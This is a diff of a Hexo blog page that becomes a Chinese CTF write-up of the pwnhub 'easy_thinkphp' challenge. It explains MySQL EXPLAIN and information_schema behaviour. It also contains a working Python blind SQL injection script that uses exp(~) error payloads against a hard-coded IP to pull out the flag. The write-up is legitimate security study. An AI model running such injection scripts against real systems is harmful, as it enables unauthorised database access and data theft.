@@ -6,15 +6,28 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href>
-  <title>Archives: 2020 | Hexo</title>
+  <title>Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
+  <meta name="description" content="#pwnhub公开赛 7月4日 ThinkPhp       难得有一个这么明显的sql注入，美极了。      天公不美，这个注入updatexml限制了子查询。    不能用xpath一系列的报错，问题不大，直接盲注就好了。 可是这里有一个问题，就是你查information_schema是返回为空的，这是因为题目用了explain关键字 explain那么什么是explain呢？  The">
+<meta property="og:type" content="article">
 <meta property="og:title" content="Hexo">
-<meta property="og:url" content="/archives/2020/index.html">
+<meta property="og:url" content="/2020/07/10/pwnhub公开赛-easy_thinkphp/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="#pwnhub公开赛 7月4日 ThinkPhp       难得有一个这么明显的sql注入，美极了。      天公不美，这个注入updatexml限制了子查询。    不能用xpath一系列的报错，问题不大，直接盲注就好了。 可是这里有一个问题，就是你查information_schema是返回为空的，这是因为题目用了explain关键字 explain那么什么是explain呢？  The">
 <meta property="og:locale" content="ch">
+<meta property="og:image" content="/assets/image/1594220882888.png">
+<meta property="og:image" content="/assets/image/1594220894501.png">
+<meta property="og:image" content="/assets/image/1594221175882.png">
+<meta property="og:image" content="/2020/07/10/pwnhub公开赛-easy_thinkphp/1594222341686.png">
+<meta property="og:image" content="/assets/image/1594223202943.png">
+<meta property="og:image" content="/assets/image/1594224920498.png">
+<meta property="og:image" content="/assets/image/1594225028624.png">
+<meta property="og:image" content="/assets/image/1594304616314.png">
+<meta property="og:updated_time" content="2020-07-10T03:44:30.538Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Hexo">
+<meta name="twitter:description" content="#pwnhub公开赛 7月4日 ThinkPhp       难得有一个这么明显的sql注入，美极了。      天公不美，这个注入updatexml限制了子查询。    不能用xpath一系列的报错，问题不大，直接盲注就好了。 可是这里有一个问题，就是你查information_schema是返回为空的，这是因为题目用了explain关键字 explain那么什么是explain呢？  The">
+<meta name="twitter:image" content="/assets/image/1594220882888.png">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -150,97 +163,192 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-pwnhub公开赛-easy_thinkphp" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>#pwnhub公开赛 7月4日 ThinkPhp    </p>
+<p>  难得有一个这么明显的sql注入，美极了。</p>
+<p>  <img src="../../../../../../../../../../../../assets/image/1594220882888.png" alt="1594220882888"></p>
+<p>  天公不美，这个注入updatexml限制了子查询。</p>
+<p><img src="../../../../../../../../../../../../assets/image/1594220894501.png" alt="1594220894501"></p>
+<p>  不能用xpath一系列的报错，问题不大，直接盲注就好了。</p>
+<p>可是这里有一个问题，就是你查information_schema是返回为空的，这是因为题目用了explain关键字</p>
+<h2 id="explain"><a href="#explain" class="headerlink" title="explain"></a>explain</h2><p>那么什么是explain呢？</p>
+<blockquote>
+<p>The <a href="https://dev.mysql.com/doc/refman/5.7/en/describe.html" target="_blank" rel="noopener"><code>DESCRIBE</code></a> and <a href="https://dev.mysql.com/doc/refman/5.7/en/explain.html" target="_blank" rel="noopener"><code>EXPLAIN</code></a> statements are synonyms. In practice, the <a href="https://dev.mysql.com/doc/refman/5.7/en/describe.html" target="_blank" rel="noopener"><code>DESCRIBE</code></a> keyword is more often used to obtain information about table structure, whereas <a href="https://dev.mysql.com/doc/refman/5.7/en/explain.html" target="_blank" rel="noopener"><code>EXPLAIN</code></a> is used to obtain a query execution plan (that is, an explanation of how MySQL would execute a query).</p>
+</blockquote>
+<p>  官网解释，des和explain是两个等价的关键字</p>
+<p>可以用来解释表结构</p>
+<p><img src="../../../../../../../../../../../../assets/image/1594221175882.png" alt="1594221175882"></p>
+<p>也可以用来分析语句<img src="1594222341686.png" alt="1594222341686"></p>
+<p>官网是这么说的：（翻了一下，英语太差。理解的可能不对）以下主要几段</p>
+<p>[]: <a href="https://dev.mysql.com/doc/refman/5.7/en/information-schema-introduction.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.7/en/information-schema-introduction.html</a></p>
+<blockquote>
+<p> <code>INFORMATION_SCHEMA</code> is a database within each MySQL instance, the place that stores information about all the other databases that the MySQL server maintains. The <code>INFORMATION_SCHEMA</code> database contains several read-only tables. They are actually views, not base tables, so there are no files associated with them, and you cannot set triggers on them. Also, there is no database directory with that name. </p>
+</blockquote>
+<p>这是information的一个小知识，这个表不是物理意义上的表，它是在内存中由mysql构造出来的，因此没有同名的数据库目录。（如果你创建一个数据库，至少你会在目录下发现这么几个东西）</p>
+<p>我的数据库如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line">+-----------------+</span><br><span class="line">| Tables_in_testt |</span><br><span class="line">+-----------------+</span><br><span class="line">| course          |</span><br><span class="line">| sc              |</span><br><span class="line">| student         |</span><br><span class="line">| v               |</span><br><span class="line">+-----------------+</span><br></pre></td></tr></table></figure>
+
+<p><img src="../../../../../../../../../../../../assets/image/1594223202943.png" alt="1594223202943"></p>
+<p>然后information里面是存着各个数据库的信息，我理解的是去读取这些目录以及frm文件来获取的。</p>
+<p>下面我们看具体的信息：</p>
+<p>[]: <a href="https://dev.mysql.com/doc/refman/5.7/en/information-schema-optimization.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.7/en/information-schema-optimization.html</a></p>
+<blockquote>
+<p> Use of constant database and table lookup values enables the server to avoid directory scans. For references to <code>VIEWS.TABLE_NAME</code>, only the <code>.frm</code> file need be opened.  </p>
+</blockquote>
+<p>就是说  <strong>为了识别表名，需要打开frm文件。因为information这是要去读取frm文件</strong></p>
+<blockquote>
+<p>No lookup values are provided (there is no <code>WHERE</code> clause), so the server must scan the data directory and each database directory. For each table thus identified, the table name and row format are selected. <code>TABLE_NAME</code> requires no further table files to be opened (the <code>SKIP_OPEN_TABLE</code> optimization applies). <code>ROW_FORMAT</code> requires all table files to be opened (<code>OPEN_FULL_TABLE</code> applies). <a href="https://dev.mysql.com/doc/refman/5.7/en/explain.html" target="_blank" rel="noopener"><code>EXPLAIN</code></a> reports <code>OPEN_FULL_TABLE</code> because it is more expensive than <code>SKIP_OPEN_TABLE</code>. </p>
+<p><code>Skip_open_table</code>: Table files do not need to be opened. The information has already become available within the query by scanning the database directory.</p>
+</blockquote>
+<p>然后在explain模式下呢，information设置了skip_open_table这个鬼东西。大概就是说，不打开任何frm文件，也就是获取不到表名。</p>
+<p><img src="../../../../../../../../../../../../assets/image/1594224920498.png" alt="1594224920498"></p>
+<p>这里我有一个疑问，既然skip_open_table是不打开frm文件，那么我给他指定表名，去让他变成open_frm_only，这样子不就是只打开frm文件，然后为什么还是读取不到row。</p>
+<p><img src="../../../../../../../../../../../../assets/image/1594225028624.png" alt="1594225028624"></p>
+<p>我翻了翻官网，</p>
+<blockquote>
+<p>For each table thus identified, the table name and row format are selected. <code>TABLE_NAME</code> requires no further table files to be opened (the <code>SKIP_OPEN_TABLE</code> optimization applies). <code>ROW_FORMAT</code> requires all table files to be opened (<code>OPEN_FULL_TABLE</code> applies). <code>EXPLAIN</code> reports <code>OPEN_FULL_TABLE</code> because it is more expensive than <code>SKIP_OPEN_TABLE</code></p>
+</blockquote>
+<p>因为extra是一个优化建议，desc是一个分析用的，在分析information_schema时，extra是一些优化建议，并没有真正使用open_frm_only去，为了节约时间还是用了skip_open_table.</p>
+<p>（PS:当然以上是我浅薄的水平，欢迎大佬纠正。）</p>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>题目给了提示，猜一猜表名，按照以往经验，不出意外是flag表，flag字段。于是写了一段poc来完成</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">payloads = <span class="string">'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.\&#123;\&#125;'</span></span><br><span class="line"> </span><br><span class="line">user=<span class="string">''</span></span><br><span class="line">print(<span class="string">'Start to retrive current user:'</span>)</span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">23</span>):</span><br><span class="line">        <span class="keyword">for</span> payload <span class="keyword">in</span> payloads:</span><br><span class="line">                payn = ord(payload)</span><br><span class="line">                headers =&#123;<span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36'</span>&#125;</span><br><span class="line">                data = <span class="string">"http://52.130.87.223:10000/?id=1 AND if(ascii(substr((select flag from thinkphp.flag), &#123;0&#125;, 1)) = '&#123;1&#125;', 1, exp(~))"</span>.format(i,payn)</span><br><span class="line">                response=requests.get(data,headers=headers)</span><br><span class="line">                <span class="comment"># print(data)</span></span><br><span class="line">                <span class="comment">#print(response.text)</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">"系统发生错误"</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                    s+=payload</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">        print(s)</span><br></pre></td></tr></table></figure>
+
+<p>exp报错原理相比不比多说吧：以 e 为底指数函数求值，配合~取反函数进行整数溢出报错 </p>
+<p>最后</p>
+<p><img src="../../../../../../../../../../../../assets/image/1594304616314.png" alt="1594304616314"></p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/07/10/pwnhub公开赛-easy_thinkphp/" class="archive-article-date">
-  	<time datetime="2020-07-10T03:44:56.764Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http:/2020/07/10/pwnhub公开赛-easy_thinkphp/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/03/23/一次渗透实战/" class="archive-article-date">
-  	<time datetime="2020-03-23T11:05:33.160Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-23</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2020/03/23/一次渗透实战/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">一次项目渗透实战</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/03/23/一次渗透实战/">一次项目渗透实战</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/03/13/学校课程之Ollydbg逆向程序破解/" class="archive-article-date">
-  	<time datetime="2020-03-13T12:36:04.025Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-13</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/03/13/学校课程之Ollydbg逆向程序破解/">学校课程实验之OD逆向简单程序</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
   
 
-    
+  
 
 
           </div>
@@ -263,8 +371,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
